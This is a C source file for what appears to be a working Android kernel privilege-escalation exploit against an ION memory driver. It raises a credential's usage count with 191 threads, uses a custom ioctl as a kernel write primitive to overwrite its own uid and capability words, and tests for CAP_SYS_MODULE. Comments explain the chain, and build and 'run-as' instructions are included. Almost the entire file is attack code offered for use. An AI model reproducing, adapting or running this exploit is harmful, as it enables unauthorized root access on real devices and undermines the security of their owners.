/* approot3.c - the decisive test: can an app-credential anchor of 192 be reached?
 *
 * The chain's first root uses cap_bset.cap[0] = 192 (0xc0) as the guard word, and
 * an app process has CapBnd = 0, so that word is absent. Every other word in an
 * app cred is either a large number (uid 10044) or zero (the capability words),
 * and neither can be a dma-buf fd: the fd table tops out at 4095, and zero words
 * appear everywhere in RAM so a sweep would spend its budget on strangers.
 *
 * There is one field an app can move on purpose: cred->usage at +0. It counts
 * the tasks sharing this credential, so creating 191 threads makes it 192 - the
 * same rare value the shell path anchors on, which the previous work measured as
 * roughly 660 occurrences across the whole 2 GB.
 *
 * With that anchor the fd number must equal 192, and the store value is the
 * buffer's IOVA, so the page index has to be 192 as well: 0x80000000 | (192<<12)
 * = 0x800C0000. The store lands at cred+4, i.e. uid, so "getuid() changed" is
 * the proof that this is our own credential.
 *
 * Then the capability step is the chain's existing one: fd 0 is made a dmabuf
 * whose IOVA carries bit 16 (0x80010000), cred+52 is zero (cap_permitted.cap[1]),
 * so the gate passes there and writes at +56 = cap_effective.
 *
 * Build: aarch64-linux-gnu-gcc -static -O2 -pthread -o approot3 approot3.c
 * Run:   run-as com.charepa ./approot3 <lo> <hi> <budget>
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/syscall.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32;

#define ION_TYPE 'I'
struct ion_allocation_data { size_t len, align; u32 heap_id_mask, flags; s32 handle; };
struct ion_fd_data { s32 handle, fd; };
struct ion_phys_data { s32 fd; u32 addr, flags; };
struct ion_custom_data { u32 cmd; unsigned long arg; };
#define ION_IOC_ALLOC  _IOWR(ION_TYPE, 0, struct ion_allocation_data)
#define ION_IOC_SHARE  _IOWR(ION_TYPE, 4, struct ion_fd_data)
#define ION_IOC_CUSTOM _IOWR(ION_TYPE, 6, struct ion_custom_data)
#define ION_IOC_PHYS   _IOWR(ION_TYPE, 9, struct ion_phys_data)

#define ION_FLAG_CACHED 1
#define ION_BUFFER_TYPE_DMA (1u << 1)
#define PAGE_OFFSET_V 0xffffffc000000000ULL
#define MEMSTART 0x01000000ULL
#define PGSZ 4096
#define ION_SLOT 3000
#define CRED_STEP 192
#define CRED_SLOTS 21

#define ALPHABET 192u
#define ALPHA_IOVA (0x80000000u | (ALPHABET << 12))   /* 0x800C0000 */
#define CLASS_FD 4
#define CLASS_IOVA 0x80010000u
#define CAP_SYS_MODULE_BIT 16

static FILE *LOG;
static int ionfd;
static void say(const char *fmt, ...){
    char b[256]; va_list ap; va_start(ap, fmt);
    vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    fputs(b, LOG); fflush(LOG);
}
static int gate(u64 a){
    struct ion_custom_data cd; cd.cmd = ION_IOC_PHYS; cd.arg = (unsigned long)a;
    errno = 0;
    return ioctl(ionfd, ION_IOC_CUSTOM, &cd);
}
static int mk_buf(int *out_fd, u32 *out_iova){
    struct ion_allocation_data a; memset(&a,0,sizeof a);
    a.len = PGSZ; a.heap_id_mask = 1u << 0; a.flags = ION_FLAG_CACHED;
    if (ioctl(ionfd, ION_IOC_ALLOC, &a) < 0) return 0;
    struct ion_fd_data d; memset(&d,0,sizeof d); d.handle = a.handle;
    if (ioctl(ionfd, ION_IOC_SHARE, &d) < 0) return 0;
    struct ion_phys_data p; memset(&p,0,sizeof p); p.fd = d.fd; p.flags = ION_BUFFER_TYPE_DMA;
    *out_iova = 0;
    if (ioctl(ionfd, ION_IOC_PHYS, &p) == 0) *out_iova = p.addr;
    *out_fd = d.fd;
    return 1;
}
static int carve(u32 want, int *out_fd){
    static int held[4096]; int n = 0;
    while (n < 4000){
        int f; u32 iv;
        if (!mk_buf(&f, &iv)) break;
        if (iv == want){ *out_fd = f; for (int i = 0; i < n; i++) close(held[i]); return 1; }
        held[n++] = f;
    }
    for (int i = 0; i < n; i++) close(held[i]);
    return 0;
}
static void *park(void *p){ (void)p; for (;;) pause(); return NULL; }

int main(int argc, char **argv){
    u32 lo = argc > 1 ? (u32)strtoul(argv[1], NULL, 16) : 0x02000000u;
    u32 hi = argc > 2 ? (u32)strtoul(argv[2], NULL, 16) : 0x7f000000u;
    long budget = argc > 3 ? atol(argv[3]) : 24;

    LOG = fopen("/data/local/tmp/approot3.txt","w"); if (!LOG) LOG = stdout;
    setbuf(LOG, NULL);
    say("approot3 uid=%d pid=%d window=0x%08x..0x%08x budget=%ld\n",
        getuid(), getpid(), lo, hi, budget);
    say("target anchor: usage=%u, fd %u, iova 0x%08x\n", ALPHABET, ALPHABET, ALPHA_IOVA);

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0){
        say("fds soft=%ld hard=%ld\n", (long)rl.rlim_cur, (long)rl.rlim_max);
        rl.rlim_cur = rl.rlim_max; setrlimit(RLIMIT_NOFILE, &rl);
    }
    int raw = open("/dev/ion", O_RDWR);
    if (raw < 0){ say("open errno=%d\n", errno); return 0; }
    ionfd = fcntl(raw, F_DUPFD, ION_SLOT);
    if (ionfd < 0) ionfd = raw; else close(raw);
    say("ion fd=%d\n", ionfd);

    /* cred->usage counts the tasks sharing it, and our own process is one of
     * them, so ALPHABET-1 extra tasks make the word 192. */
    int made = 0;
    for (unsigned i = 0; i + 1 < ALPHABET; i++){
        pthread_t t;
        if (pthread_create(&t, NULL, park, NULL) != 0) break;
        pthread_detach(t);
        made++;
    }
    int threads_now = -1;
    { FILE *f = fopen("/proc/self/status", "r");
      if (f){ char l[256]; while (fgets(l, sizeof l, f))
          if (!strncmp(l, "Threads:", 8)) { threads_now = atoi(l + 8); break; } fclose(f); } }
    say("threads made=%d Threads=%d (usage should be %d)\n", made, threads_now, threads_now);

    int a;
    if (!carve(ALPHA_IOVA, &a)){ say("no buffer with iova 0x%08x\n", ALPHA_IOVA); return 0; }
    say("carved fd %d\n", a);
    if (a != (int)ALPHABET){
        if (dup2(a, (int)ALPHABET) < 0){ say("dup2(%u) errno=%d\n", ALPHABET, errno); return 0; }
        close(a);
    }
    say("alphabet buffer on fd %u, iova 0x%08x\n", ALPHABET, ALPHA_IOVA);

    u32 uid0 = (u32)getuid();
    say("uid before = %u (0x%08x)\n", uid0, uid0);

    /* phase A: the anchor at cred+0. A match writes at +4, so uid changes. */
    long probes = 0, stores = 0; u64 found = 0;
    for (u32 p = lo; p < hi && !found && stores < budget; p += PGSZ){
        u64 pg = (u64)PAGE_OFFSET_V + p - MEMSTART;
        for (int s = 0; s < CRED_SLOTS; s++){
            u64 o = pg + (u64)s * CRED_STEP;
            if ((size_t)s * CRED_STEP + 132 >= PGSZ) break;
            probes++;
            if (gate(o) != 0) continue;              /* the word is not 192 */
            stores++;
            if ((u32)getuid() != uid0){ found = o; break; }
            if (stores >= budget) break;
        }
    }
    say("phase A probes=%ld stores=%ld uid now=%u found=%s\n",
        probes, stores, (u32)getuid(), found ? "yes" : "no");
    if (!found){ say("APPROOT3 DONE (no anchor hit)\n"); return 0; }
    say("own cred at 0x%llx\n", (unsigned long long)found);

    /* phase B: the capability word. fd 4 holds an IOVA with bit 16, and cred+52
     * is cap_permitted.cap[1] == 0, so gate(cred+52) writes at cred+56. */
    int c;
    if (!carve(CLASS_IOVA, &c)){ say("no buffer with iova 0x%08x\n", CLASS_IOVA); return 0; }
    if (c != CLASS_FD){
        if (dup2(c, CLASS_FD) < 0){ say("dup2(%d) errno=%d\n", CLASS_FD, errno); return 0; }
        close(c);
    }
    /* fd 0 must NOT be a dmabuf for this to test "the word at +52 is zero"... but
     * the class buffer is on fd 4, so a zero word looks up fd 0 and misses. That
     * is the safe form: only the word 4 could pass, and cred+52 is 0, so nothing
     * is written. What actually grants the capability is the chain's own trick:
     * put the class buffer on fd 0 so the zero word at +52 resolves to it. */
    if (dup2(CLASS_FD, 0) < 0){ say("dup2(0) errno=%d\n", errno); return 0; }
    int r = gate(found + 52);
    say("gate(cred+52) rc=%d errno=%d (0 means the store landed)\n", r, errno);

    errno = 0;
    syscall(105, "\x7f""ELF", 4UL, "");
    say("probe_module errno=%d (8 = CAP_SYS_MODULE held and image rejected)\n", errno);
    say("APPROOT3 DONE\n");
    return 0;
}
